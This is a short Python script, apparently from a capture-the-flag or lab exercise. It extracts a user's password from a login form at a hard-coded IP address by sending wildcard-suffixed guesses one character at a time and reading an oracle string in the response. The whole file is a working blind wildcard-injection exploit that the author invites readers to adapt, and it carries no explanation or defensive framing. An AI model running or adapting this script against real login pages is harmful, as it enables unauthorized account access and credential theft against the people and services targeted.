import requests
list_char=['a','b','c','d','e','f','g','h','i','j','k',
'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
'A','B',
'C','D','E','F','G','H','I','J','K','L','M','N','O','P'
,'Q','R','S','T','U','V','W','X','Y','Z',
'1','2','3','4','5','6',
'7','8','9','0','!','"','#','$','%','&',"'",'(',')','+',',','-',
'.','/',':',';','<','=','>','?','@','[',']','^','_','~','`',
'{','|','}'] # Creating character list

url='http://159.65.92.13:31319/login'
data_sent={'username':'Reese','password':'stranger things'} #Data to be sent. Can include tokens if possible
result=''
#This part can be edited. For the current code below any valid user / password character along with '*' can be used to login to the portal for whhich the logic is written.
flag=1
while flag==1:
    flag=0
    for ch in list_char:
        data_sent['password']=result+ch+'*'
        response=requests.post(url,data=data_sent)
        if('No search results' in response.text):
            flag=1
            result+=ch
            print(result)
            break
print('Gotcha!!')
